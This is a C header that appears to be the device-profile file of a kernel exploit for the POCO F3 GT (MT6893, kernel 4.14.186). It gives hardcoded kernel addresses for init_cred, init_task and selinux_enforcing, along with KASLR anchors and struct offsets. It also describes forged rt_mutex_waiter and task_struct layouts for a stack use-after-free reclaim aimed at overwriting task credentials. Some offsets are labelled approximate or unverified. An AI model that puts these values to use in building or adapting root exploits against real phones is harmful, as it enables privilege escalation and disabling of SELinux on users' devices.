/*
 * Generated for aresin (MT6893 Dimensity 1200, 4.14.186-android13)
 * POCO F3 GT / Redmi K40 Gaming Edition
 *
 * All offsets extracted from kernel binary analysis (boot.img vmlinux)
 * Device: POCO F3 GT (aresin), Android 13, MIUI V14.0.4.0.TKJCNXM
 * Kernel: 4.14.186-g0dc1d312efb3
 */
#ifndef TARGET_H
#define TARGET_H

/* target profile */
#define KIMAGE_TEXT_BASE   0xffffff939bc80000ULL
#define P0_PAGE_OFFSET     0xffffff8000000000ULL   /* CONFIG_ARM64_VA_BITS=39 */
#define P0_PHYS_OFFSET     0x40000000ULL           /* MT6893 typical */
#define P0_KERNEL_PHYS_LOAD 0x40000000ULL
#define PSELECT_WAITER_WORD_SHIFT 2

/* kernel image addresses (from /proc/kallsyms and binary analysis) */
#define INIT_TASK          0xffffff939d8dc058ULL   /* Based on swapper/0 string location */
#define INIT_CRED          0xffffff939dae3850ULL   /* prepare_kernel_cred loads from this pointer (BSS) */
#define ENTRY_TASK         0xffffff939d404028ULL   /* __switch_to reference (per-CPU) */
#define PER_CPU_OFFSET     0xffffff939d404028ULL   /* per_cpu area base */
#define ROOT_TASK_GROUP    0xffffff939d8ce1f0ULL   /* fork_init reference */
#define SELINUX_ENFORCING  0xffffff939dd00b28ULL   /* Found via enforcing_setup */

/* KASLR anchors (slide=0, fixed kimage_vaddr) */
/* These are stable data references for KASLR slide detection */
#define SLIDE_NFULNL_LOGGER_IMAGE      0xffffff939d8dc658ULL   /* "swapper/0" string */
#define SLIDE_LOGGERS_0_1_IMAGE        0xffffff939d8dc658ULL   /* Same as above */
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE 0xffffff939d8dc658ULL  /* Same as above */
#define SLIDE_INIT_TASK_IMAGE          0xffffff939d8dc058ULL   /* init_task address */
#define SLIDE_ROOT_TASK_GROUP_IMAGE    0xffffff939d8ce1f0ULL   /* root_task_group address */

/*
 * waiter fields (rt_mutex_waiter)
 * 4.14.186 ARM64 - extracted from rt_mutex_init_waiter and remove_waiter disassembly
 *
 * struct rt_mutex_waiter {
 *     struct rb_node   tree_entry;      // 0x00 (24 bytes)
 *     struct rb_node   pi_tree_entry;   // 0x18 (24 bytes)
 *     struct task_struct *task;         // 0x30 (8 bytes)
 *     struct rt_mutex  *lock;           // 0x38 (8 bytes)
 *     int              prio;            // 0x40 (4 bytes)
 *     // padding: 4 bytes
 *     u64              deadline;        // 0x48 (8 bytes)
 * };
 */
#define WAITER_TREE_ENTRY_OFF       0x00
#define WAITER_PI_TREE_ENTRY_OFF    0x18
#define WAITER_TASK_OFF             0x30
#define WAITER_LOCK_OFF             0x38
#define WAITER_WAKE_STATE_OFF       0x00   /* Not present in 4.14, mapped to tree_entry */
#define WAITER_PRIO_OFF             0x40
#define WAITER_DEADLINE_OFF         0x48
#define WAITER_WW_CTX_OFF           0x00   /* Not present in 4.14 */

/* fake waiter (packed layout for stack-UAF reclaim, matches upstream CyberMeowfia) */
/* Layout: [tree rb_node 24B][tree prio 4B][pad 4B][tree deadline 8B]
 *         [pi_tree rb_node 24B][pi prio 4B][pad 4B][pi deadline 8B]
 *         [task ptr 8B][lock ptr 8B][wake_state 4B][pad 4B][ww_ctx 8B] */
#define FAKE_WAITER_TREE_PRIO_OFF          0x18   /* after tree_entry rb_node */
#define FAKE_WAITER_TREE_DEADLINE_OFF      0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF      0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF       0x40   /* after pi_tree_entry rb_node */
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF   0x48
#define FAKE_WAITER_TASK_OFF               0x50
#define FAKE_WAITER_LOCK_OFF               0x58
#define FAKE_WAITER_WAKE_STATE_OFF         0x60
#define FAKE_WAITER_WW_CTX_OFF             0x68

/*
 * fake task fields (task_struct)
 * 4.14.186 MT6893 - extracted from commit_creds, task_blocks_on_rt_mutex,
 *                   rt_mutex_adjust_prio_chain disassembly
 *
 * Key offsets verified:
 *   prio:          0x84  (from task_blocks_on_rt_mutex: LDR W8, [X20, #0x84])
 *   real_cred:     0x788 (from commit_creds: LDR X19, [X20, #0x788])
 *   cred:          0x790 (from commit_creds: LDR X8, [X20, #0x790])
 *   deadline:      0x388 (from task_blocks_on_rt_mutex: LDR X10, [X20, #0x388])
 *   pi_lock:       0x85c (from task_blocks_on_rt_mutex: ADD X24, X2, #0x85c)
 *   pi_waiters:    0x868 (from rt_mutex_adjust_prio_chain: LDR X8, [X19, #0x868])
 *   pi_top_task:   0x870 (from rt_mutex_adjust_prio_chain: LDR X8, [X19, #0x870])
 *   pi_blocked_on: 0x880 (from rt_mutex_adjust_prio_chain: LDR X25, [X19, #0x880])
 */
#define FAKE_TASK_USAGE_OFF         0x10   /* atomic_t usage, approximate */
#define FAKE_TASK_PRIO_OFF          0x84
#define FAKE_TASK_NORMAL_PRIO_OFF   0x88   /* Likely prio + 4, needs verification */
#define FAKE_TASK_TASK_GROUP_OFF    0x848  /* sched_task_group, approximate */
#define FAKE_TASK_PI_LOCK_OFF       0x85c
#define FAKE_TASK_PI_WAITERS_OFF    0x868
#define FAKE_TASK_PI_TOP_TASK_OFF   0x870
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x880
#define FAKE_TASK_UCLAMP_REQ_OFF    0x0    /* Not present in 4.14 */
#define FAKE_TASK_UCLAMP_OFF        0x0    /* Not present in 4.14 */

/* task credential pointers */
#define TASK_REAL_CRED_OFF   0x788
#define TASK_CRED_OFF        0x790

#endif /* TARGET_H */
